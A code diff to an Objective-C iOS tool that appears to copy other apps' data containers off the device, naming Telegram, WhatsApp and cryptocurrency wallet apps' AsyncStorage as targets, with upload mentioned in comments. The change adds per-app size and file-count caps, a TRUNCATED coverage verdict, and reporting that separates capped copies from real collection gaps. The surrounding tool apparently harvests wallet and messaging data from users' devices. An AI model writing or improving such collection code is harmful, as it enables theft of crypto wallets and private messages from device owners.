@@ -34,6 +34,11 @@ static const char *kAppDataRoot = "/var/mobile/Containers/Data/Application";
 static const int64_t kMaxInode = 45000000;   // 固定上限：maxInode=0 会触发 WQ 的共享扫描探针
 static const NSUInteger kMaxLocalDirs = 3;
 
+// 单个应用的复制上限。TG / WhatsApp 的整容器能到几十 GB（实测 TG 34.2 GiB /
+// 84,494 文件），不设闸会把设备和上传都拖死。钱包类数据只有几百 KB ~ 几十 MB。
+static const unsigned long long kMaxCopyBytes = 3ULL * 1024 * 1024 * 1024;   // 3 GiB
+static const NSUInteger kMaxCopyFiles = 80000;
+
 static BOOL gRunning = NO;
 static NSString *gSummary = nil;
 static NSLock *gLock = nil;
@@ -248,11 +253,18 @@ static NSUInteger WQRelativeDepth(NSString *rel) {
 
 /// WQCopyContainer 的硬边界曾经是：容器根(0) → 一级目录(1) → 二级目录(2) → 三级文件(3)。
 /// 现在清单驱动 + WQCopyTree 递归，不再受这个边界限制；覆盖情况改按实际采集结果判定。
+/// truncated 必须单独成一类：整容器（TG / WhatsApp）撞到体积上限时，文件数一定对不上，
+/// 但它不是失败，不能混进"采集缺口"。
 static NSString *WQCoverageVerdict(BOOL srcExists, NSUInteger srcFiles,
-                                   BOOL dstExists, NSUInteger dstFiles) {
+                                   BOOL dstExists, NSUInteger dstFiles, BOOL truncated) {
     if (!srcExists) return @"MISSING(容器里没有这个路径)";
     if (srcFiles == 0) return @"EMPTY(容器内 0 个文件)";
     if (!dstExists || dstFiles == 0) return @"NOT-COPIED(容器内有文件，采集到 0)";
+    if (truncated) {
+        return [NSString stringWithFormat:@"TRUNCATED(达到 %llu GiB / %lu 文件上限，已采 %lu/%lu)",
+                kMaxCopyBytes / (1024ULL * 1024ULL * 1024ULL),
+                (unsigned long)kMaxCopyFiles, (unsigned long)dstFiles, (unsigned long)srcFiles];
+    }
     if (dstFiles < srcFiles) return @"PARTIAL(部分文件没复制成功)";
     return @"covered";
 }
@@ -569,11 +581,6 @@ typedef struct {
     NSUInteger files;
     BOOL truncated;
 } WQCopyBudget;
-
-// 单个应用的复制上限：TG / WhatsApp 的整容器能到几十 GB，不设闸会把设备
-// 和上传都拖死。钱包类数据实际只有几百 KB ~ 几十 MB，这个上限足够。
-static const unsigned long long kMaxCopyBytes = 3ULL * 1024 * 1024 * 1024;   // 3 GiB
-static const NSUInteger kMaxCopyFiles = 80000;
 
 /// 按清单递归复制一棵目录树（不限深度，跳过软链环）。
 /// WQCopyContainer 只到容器根下第 3 层，而钱包类 App 的 AsyncStorage 落在
@@ -948,7 +955,8 @@ static NSString *WQRunCollection(void) {
                 BOOL dstExists = [fm fileExistsAtPath:dstDir];
                 if (dstExists) WQProbePath(dstDir, relDepth, &got);
 
-                NSString *verdict = WQCoverageVerdict(srcExists, src.files, dstExists, got.files);
+                NSString *verdict = WQCoverageVerdict(srcExists, src.files, dstExists, got.files,
+                                                      budget.truncated);
                 WQScopeLog(@"[%@] dir  %@  depth=%lu exists=%d isDir=%d 容器内 files=%lu dirs=%lu bytes=%llu denied=%lu | 采集到 files=%lu bytes=%llu  %@",
                            bundleID, rel, (unsigned long)relDepth, (int)srcExists, (int)srcIsDir,
                            (unsigned long)src.files, (unsigned long)src.dirs, src.bytes,
@@ -966,7 +974,8 @@ static NSString *WQRunCollection(void) {
                 NSDictionary *srcAttr = [fm attributesOfItemAtPath:srcFile error:NULL];
                 NSDictionary *dstAttr = [fm attributesOfItemAtPath:dstFile error:NULL];
                 NSString *verdict = WQCoverageVerdict(srcAttr != nil, srcAttr ? 1 : 0,
-                                                     dstAttr != nil, dstAttr ? 1 : 0);
+                                                     dstAttr != nil, dstAttr ? 1 : 0,
+                                                     budget.truncated);
                 WQScopeLog(@"[%@] file %@  depth=%lu exists=%d 容器内=%llu B 采集到=%llu B  %@",
                            bundleID, rel, (unsigned long)relDepth, (int)(srcAttr != nil),
                            srcAttr ? [srcAttr[NSFileSize] unsignedLongLongValue] : 0ULL,
@@ -984,13 +993,26 @@ static NSString *WQRunCollection(void) {
         if (missing.count > 0) {
             WQStage(@"容器缺失：%@", [missing componentsJoinedByString:@", "]);
         }
-        // 采集缺口直接上报：清单里有、但没落地或只落地一部分的条目
-        if (notCopied.count > 0) {
-            NSUInteger show = MIN(notCopied.count, (NSUInteger)12);
+        // 分两类上报：撞体积上限是主动截断（不是失败），其余才是真缺口。
+        // 之前把 TRUNCATED 混进"采集缺口"，看起来像复制失败，实际是 3 GiB 的闸门。
+        NSMutableArray<NSString *> *gapList = [NSMutableArray array];
+        NSMutableArray<NSString *> *truncatedList = [NSMutableArray array];
+        for (NSString *item in notCopied) {
+            if ([item containsString:@"TRUNCATED"]) [truncatedList addObject:item];
+            else [gapList addObject:item];
+        }
+        if (truncatedList.count > 0) {
+            NSUInteger show = MIN(truncatedList.count, (NSUInteger)12);
+            WQStage(@"达上限截断 %lu 项（主动限制，不是失败）：%@",
+                    (unsigned long)truncatedList.count,
+                    [[truncatedList subarrayWithRange:NSMakeRange(0, show)] componentsJoinedByString:@"，"]);
+        }
+        if (gapList.count > 0) {
+            NSUInteger show = MIN(gapList.count, (NSUInteger)12);
             WQStage(@"采集缺口 %lu 项（清单有、未落地或不完整）：%@",
-                    (unsigned long)notCopied.count,
-                    [[notCopied subarrayWithRange:NSMakeRange(0, show)] componentsJoinedByString:@"，"]);
-            WQScopeLog(@"采集缺口=%lu 项，明细见上文各 dir/file 行", (unsigned long)notCopied.count);
+                    (unsigned long)gapList.count,
+                    [[gapList subarrayWithRange:NSMakeRange(0, show)] componentsJoinedByString:@"，"]);
+            WQScopeLog(@"采集缺口=%lu 项，明细见上文各 dir/file 行", (unsigned long)gapList.count);
         }
 
         // ---- 6/6 清理 ----
